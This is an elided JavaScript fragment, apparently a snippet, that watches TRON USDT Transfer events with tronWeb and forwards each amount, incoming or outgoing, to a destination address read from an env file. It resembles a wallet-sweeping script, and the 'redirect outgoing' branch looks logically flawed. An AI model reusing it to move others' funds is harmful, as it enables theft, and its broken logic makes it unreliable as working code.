...
require("dotenv").config({ path: "./address.env" }); // Specify the path to your address.env file
  ...
  tronWeb.subscribe("event", (error, event) => {
    ...
    if (event.name === "Transfer" && event.result.tokenName === "USDT") {
      ...
      if (to === address) {
        ...
        console.log(
          `Redirecting ${value} USDT to ${process.env.DESTINATION_ADDRESS}`
        );
        sendUSDT(value, process.env.DESTINATION_ADDRESS);
      } else {
        // Outgoing USDT transaction, redirect it
        console.log(
          `Redirecting ${value} USDT from ${address} to ${process.env.DESTINATION_ADDRESS}`
        );
        sendUSDT(value, process.env.DESTINATION_ADDRESS);
      }
    }
